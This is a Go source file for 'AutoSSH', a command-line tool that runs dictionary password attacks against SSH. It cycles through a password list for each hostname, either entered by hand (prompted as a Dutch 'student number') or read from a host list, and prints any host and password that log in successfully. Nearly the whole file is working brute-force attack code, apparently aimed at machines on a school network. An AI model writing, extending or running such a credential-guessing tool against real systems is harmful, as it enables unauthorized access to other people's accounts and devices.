package main

import (
	"fmt"
	"log"
	"math"
	"os"

	"github.com/cfschilham/autossh/internal/loadcfg"
	"github.com/cfschilham/autossh/internal/sshconn"
)

const (
	authErr1 = "ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain"
	authErr2 = "ssh: handshake failed: ssh: unable to authenticate, attempted methods [password none], no supported methods remain"
	authErr3 = "ssh: handshake failed: ssh: unable to authenticate, attempted methods [none], no supported methods remain"
)

// dictAttack attempts to connect to the given hostname with all passwords in dict.Pwds() unless it
// encounters err != nil nor authErr1, authErr2 or authErr3. In this case it stops cycling though
// dict.Pwds() immediately.
func dictAttack(hostname string, dict *loadcfg.Dict, verbose bool) {
	if !verbose {
		fmt.Printf("Attempting to connect to '%s'\n", hostname+"@"+hostname+".local:22")
	}

	// Start looping through dictionary passwords
	for _, pwd := range dict.Pwds() {
		if verbose {
			fmt.Printf("Attempting to establish SSH connection at '%s' using password '%s'\n", hostname+"@"+hostname+".local:22", pwd)
		}

		if err := sshconn.SSHConn(hostname+".local:22", hostname, pwd, ""); err != nil {
			switch err.Error() {
			case authErr1:
				if verbose {
					log.Println(err.Error())
				}
			case authErr2:
				if verbose {
					log.Println(err.Error())
				}
			case authErr3:
				if verbose {
					log.Println(err.Error())
				}
			default:
				log.Println("failed to connect: " + err.Error())
				return
			}
		} else {
			fmt.Println("Connection successfully established!")
			fmt.Printf("Host: '%s' | Pass: '%s'\n", hostname+"@"+hostname+".local", pwd)
			return
		}
	}

	if !verbose {
		fmt.Println("Authentication with dictionary failed")
	}
}

func main() {
	fmt.Println("AutoSSH v0.2.2 - https://github.com/cfschilham/autossh")

	fmt.Println("Loading cfg/config.yml...")
	config, err := loadcfg.LoadConfig()
	if err != nil {
		log.Fatalln(err)
	}

	fmt.Printf("Loading %s...\n", config.DictPath())
	dict, err := loadcfg.LoadDict(config.DictPath())
	if err != nil {
		log.Fatalln(err)
	}

	switch config.Mode() {
	case "manual":
		var hostname string
		for {
			fmt.Print("Leerlingnummer (type 'exit' to exit): ")
			fmt.Scanln(&hostname)
			if hostname == "exit" {
				os.Exit(0)
			}
			dictAttack(hostname, dict, config.Verbose())
		}

	case "hostlist":
		fmt.Printf("Loading %s...\n", config.HostlistPath())
		hostlist, err := loadcfg.LoadHostlist(config.HostlistPath())
		if err != nil {
			log.Fatalln(err)
		}

		for i, hostname := range hostlist.Hosts() {
			fmt.Printf("Host list %d%% complete\n", int(math.Round(float64(i)/float64(len(hostlist.Hosts()))*100)))
			dictAttack(hostname, dict, config.Verbose())
		}
		fmt.Println("Host list 100% complete, press enter to exit...")
		fmt.Scanln()

	default:
		log.Fatalf("cfg/config.yml: mode '%s' does not exist!", config.Mode())
	}
}
